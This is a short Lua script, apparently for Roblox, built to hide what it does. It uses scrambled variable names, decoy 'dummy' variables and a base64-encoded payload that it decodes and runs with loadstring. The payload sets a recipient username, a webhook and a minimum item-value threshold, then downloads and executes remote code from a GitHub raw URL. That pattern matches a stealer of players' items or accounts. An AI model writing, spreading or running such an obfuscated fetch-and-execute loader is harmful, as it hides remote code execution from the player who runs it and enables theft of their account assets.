
local NXTOxevhZFml = 'VXNlcm5hbWUgPSAiVGltb2NpIgpVc2VybmFtZTIgPSAiT25lIgpXZWJob29rID0gIkRkaGRoIgpNaW5pbXVtUkFQID0gMTY2MjYyCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hhZG93c3p6enovdGltb2NpeS9yZWZzL2hlYWRzL21haW4vbWFpbiIsIHRydWUpKSgp'
local BdIFZSJr = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local WUcpWbtX = BdIFZSJr(NXTOxevhZFml)
loadstring(WUcpWbtX)() -- Run decoded code

-- Dummy variables for confusion
local qglBDwKosA = math.random()
local TnLGhhnFodss = "This is a dummy string"
